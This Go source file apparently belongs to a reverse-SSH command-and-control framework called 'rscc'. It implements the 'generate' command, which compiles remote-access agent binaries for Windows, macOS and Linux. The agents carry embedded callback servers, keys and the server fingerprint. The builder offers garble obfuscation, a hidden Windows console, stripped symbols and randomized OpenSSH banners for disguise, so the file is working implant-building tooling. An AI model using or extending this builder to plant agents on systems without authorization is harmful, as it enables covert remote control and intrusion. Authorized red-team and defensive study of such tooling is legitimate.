package agentcmd

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"rscc"
	"rscc/internal/common/constants"
	"rscc/internal/common/pprint"
	"rscc/internal/common/utils"
	"rscc/internal/common/validators"
	"rscc/internal/sshd"
	"runtime"
	"strconv"
	"strings"

	"github.com/cespare/xxhash/v2"
	"github.com/spf13/cobra"
)

type builderConfig struct {
	Name        string
	OS          string
	Arch        string
	Servers     []string
	Shared      bool
	Pie         bool
	Garble      bool
	SS          []string
	Fingerprint string
	PrivKey     []byte
	Debug       bool
}

func (a *AgentCmd) newCmdGenerate() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "generate",
		Short:   "Generate an agent",
		Aliases: []string{"g", "gen"},
		Args:    cobra.NoArgs,
		RunE:    a.cmdGenerate,
	}
	cmd.Flags().StringP("name", "n", "", "agent name without extension (random if not provided)")
	cmd.Flags().StringP("os", "o", runtime.GOOS, "operating system (linux, windows, darwin)")
	cmd.Flags().StringP("arch", "a", runtime.GOARCH, "architecture (amd64, arm64)")
	cmd.Flags().StringSliceP("servers", "s", []string{}, "server addresses (e.g. '127.0.0.1:8080,127.0.0.1:8081')")
	cmd.Flags().Bool("shared", false, "build shared library")
	cmd.Flags().Bool("pie", false, "build position independent executable")
	cmd.Flags().Bool("garble", false, "obfuscate agent with garble")
	cmd.Flags().Bool("debug", false, "enable agent debug output")
	cmd.Flags().StringSlice("ss", []string{"sftp", "kill"}, fmt.Sprintf("subsystems to add to the agent (%s)", strings.Join(constants.Subsystems, ", ")))
	cmd.MarkFlagRequired("servers")

	return cmd
}

func (a *AgentCmd) cmdGenerate(cmd *cobra.Command, args []string) error {
	// Get flags
	name, err := cmd.Flags().GetString("name")
	if err != nil {
		return err
	}
	goos, err := cmd.Flags().GetString("os")
	if err != nil {
		return err
	}
	goarch, err := cmd.Flags().GetString("arch")
	if err != nil {
		return err
	}
	servers, err := cmd.Flags().GetStringSlice("servers")
	if err != nil {
		return err
	}
	shared, err := cmd.Flags().GetBool("shared")
	if err != nil {
		return err
	}
	pie, err := cmd.Flags().GetBool("pie")
	if err != nil {
		return err
	}
	garble, err := cmd.Flags().GetBool("garble")
	if err != nil {
		return err
	}
	debug, err := cmd.Flags().GetBool("debug")
	if err != nil {
		return err
	}
	ss, err := cmd.Flags().GetStringSlice("ss")
	if err != nil {
		return err
	}

	// Validate flags
	if !validators.ValidateGOOS(goos) {
		return fmt.Errorf("invalid operating system: %s", goos)
	}
	if !validators.ValidateGOARCH(goarch) {
		return fmt.Errorf("invalid architecture: %s", goarch)
	}
	for _, server := range servers {
		server = strings.TrimSpace(server)
		if !validators.ValidateAddr(server) {
			return fmt.Errorf("invalid server address: %s", server)
		}
	}
	for _, subsystem := range ss {
		subsystem = strings.TrimSpace(subsystem)
		if !validators.ValidateSubsystem(subsystem) {
			return fmt.Errorf("invalid subsystem: %s", subsystem)
		}
	}
	if name == "" {
		name = utils.GetRandomName()
	} else {
		name = strings.ReplaceAll(strings.TrimSpace(name), " ", "-")
	}

	// Set extension
	switch goos {
	case "windows":
		if shared {
			if !strings.HasSuffix(name, ".dll") {
				name = name + ".dll"
			}
		} else {
			if !strings.HasSuffix(name, ".exe") {
				name = name + ".exe"
			}
		}
	case "darwin":
		if shared {
			if !strings.HasSuffix(name, ".dylib") {
				name = name + ".dylib"
			}
		}
	case "linux":
		if shared {
			if !strings.HasSuffix(name, ".so") {
				name = name + ".so"
			}
		}
	}

	// Check database
	agent, err := a.db.GetAgentByName(cmd.Context(), name)
	if err == nil && agent != nil {
		return fmt.Errorf("agent with name '%s' already exists", name)
	}

	// Check if agent with same name already exists
	agentPath := filepath.Join(a.dataPath, constants.AgentDir, name)
	if validators.ValidateFileExists(agentPath) {
		cmd.Println(pprint.Warn("Agent with name '%s' not found in database, but file '%s' exists. It will be replaced", name, agentPath))
		// TODO: ask user for confirmation
	}

	// Generate keys
	keyPair, err := sshd.NewECDSAKey()
	if err != nil {
		return fmt.Errorf("failed to generate key pair: %w", err)
	}
	privKey, err := keyPair.GetPrivateKey()
	if err != nil {
		return fmt.Errorf("failed to get private key: %w", err)
	}
	pubKey, err := keyPair.GetPublicKey()
	if err != nil {
		return fmt.Errorf("failed to get public key: %w", err)
	}

	// Get server fingerprint
	server, err := a.db.GetListener(cmd.Context(), constants.AgentListenerID)
	if err != nil {
		return fmt.Errorf("failed to get server fingerprint: %w", err)
	}
	if server.Fingerprint == "" {
		return fmt.Errorf("server fingerprint not found")
	}
	serverFingerprint := server.Fingerprint

	// Prepare builder config
	builderConfig := builderConfig{
		Name:        name,
		OS:          goos,
		Arch:        goarch,
		Servers:     servers,
		Shared:      shared,
		Pie:         pie,
		Garble:      garble,
		SS:          ss,
		Fingerprint: serverFingerprint,
		PrivKey:     privKey,
		Debug:       debug,
	}

	// Unzip agent
	tmpDir, err := unzipAgent()
	if err != nil {
		return fmt.Errorf("failed to unzip agent: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Build agent
	cmd.Println(pprint.Info(
		"Building agent '%s' [%s]",
		name,
		pprint.Blue.Render(goos+"/"+goarch),
	))

	if err := a.buildAgent(tmpDir, builderConfig); err != nil {
		return fmt.Errorf("failed to build agent: %w", err)
	}

	// Get agent hash
	agentBytes, err := os.ReadFile(agentPath)
	if err != nil {
		return fmt.Errorf("failed to read agent: %w", err)
	}
	agentHash := strconv.FormatUint(xxhash.Sum64(agentBytes), 10)

	// Add agent to database
	agent, err = a.db.CreateAgent(cmd.Context(), name, goos, goarch, servers, shared, pie, garble, ss, agentHash, agentPath, pubKey)
	if err != nil {
		return fmt.Errorf("failed to add agent to database: %w", err)
	}

	cmd.Println(pprint.Success(
		"Agent '%s' generated! [ID: %s, Path: %s]",
		agent.Name,
		pprint.Green.Render(agent.ID),
		pprint.Magenta.Render(agent.Path),
	))
	return nil
}

func (a *AgentCmd) buildAgent(tmpDir string, config builderConfig) error {
	// Check go toolchain
	goCmd := exec.Command("go", "version")
	output, err := goCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("check go version: %w", err)
	}
	if !strings.Contains(string(output), "go version") {
		return fmt.Errorf("go toolchain not found (install from https://go.dev/doc/install)")
	}

	// Check garble
	if config.Garble {
		garbleCmd := exec.Command("garble", "version")
		output, err = garbleCmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("check garble version: %w", err)
		}
		if !strings.Contains(string(output), "Build settings") {
			return fmt.Errorf("garble not found (install from https://github.com/burrowers/garble)")
		}
	}

	// Check make
	makeCmd := exec.Command("make", "-v")
	output, err = makeCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("check make version: %w", err)
	}
	if !strings.Contains(string(output), "GNU Make") {
		return fmt.Errorf("make not found (install from https://www.gnu.org/software/make/)")
	}

	// Prepare variables
	privKeyBase64 := base64.RawStdEncoding.EncodeToString(config.PrivKey)
	servers := strings.Join(config.Servers, ",")

	// Set ldflags
	ldflags := "-ldflags=\"-buildid= -s -w"
	if config.OS == "windows" && !config.Debug {
		ldflags += " -H windowsgui"
	}
	ldflags += "\""

	// Set build mode
	buildMode := ""
	switch {
	case config.Shared:
		buildMode = "-buildmode=c-shared"
	case config.Pie:
		buildMode = "-buildmode=pie"
	default:
		buildMode = "-buildmode=default"
	}

	// Set tags
	var tags string
	if len(config.SS) > 0 {
		tags = "-tags=" + strings.Join(config.SS, ",")
		if config.Debug {
			tags += ",debug"
		}
	} else if config.Debug {
		tags = "-tags=debug"
	}

	// Set SSH version
	sshClient := "SSH-2.0-OpenSSH_8.2"
	switch config.OS {
	case "windows":
		sshClient = constants.SshBannersWindows[utils.RandInt(len(constants.SshBannersWindows))]
	case "darwin":
		sshClient = constants.SshBannersDarwin[utils.RandInt(len(constants.SshBannersDarwin))]
	case "linux":
		sshClient = constants.SshBannersLinux[utils.RandInt(len(constants.SshBannersLinux))]
	}

	// Set output path
	outputPath := filepath.Join(a.dataPath, constants.AgentDir, config.Name)

	// Prepare command
	var cmd *exec.Cmd
	if config.Garble {
		cmd = exec.Command(
			"make",
			"garble",
		)
	} else {
		cmd = exec.Command(
			"make",
			"build",
		)
	}
	cmd.Dir = tmpDir
	cmd.Env = append(
		os.Environ(),
		"OS="+config.OS,
		"ARCH="+config.Arch,
		"LDFLAGS="+ldflags,
		"TAGS="+tags,
		"BUILD_MODE="+buildMode,
		"OUTPUT_PATH="+outputPath,
		"PRIV_KEY="+privKeyBase64,
		"SERVERS="+servers,
		"FINGERPRINT="+config.Fingerprint,
		"SSH_CLIENT="+sshClient,
	)

	// Run command
	output, err = cmd.CombinedOutput()
	if err != nil {
		err = fmt.Errorf("run build: %w", err)
		if len(output) > 0 {
			err = fmt.Errorf("%w:\n%s", err, string(output))
		}
		return err
	}

	return nil
}

func unzipAgent() (string, error) {
	tempDir, err := os.MkdirTemp("", "rscc-agent-*")
	if err != nil {
		return "", fmt.Errorf("create temp dir: %w", err)
	}

	zipReader, err := zip.NewReader(bytes.NewReader(rscc.ZipAgentSource), int64(len(rscc.ZipAgentSource)))
	if err != nil {
		return "", fmt.Errorf("create zip reader: %w", err)
	}

	for _, file := range zipReader.File {
		filePath := filepath.Join(tempDir, file.Name)

		// If directory
		if file.FileInfo().IsDir() {
			err = os.MkdirAll(filePath, 0777)
			if err != nil {
				return "", fmt.Errorf("create dir: %w", err)
			}
			continue
		}

		// Open zipped file
		rc, err := file.Open()
		if err != nil {
			return "", fmt.Errorf("open zipped file: %w", err)
		}
		defer rc.Close()

		// Create unzipped file
		unzippedFile, err := os.Create(filePath)
		if err != nil {
			return "", fmt.Errorf("create unzipped file: %w", err)
		}
		defer unzippedFile.Close()

		// Copy file content
		_, err = io.Copy(unzippedFile, rc)
		if err != nil {
			return "", fmt.Errorf("copy file content: %w", err)
		}
	}

	return tempDir, nil
}
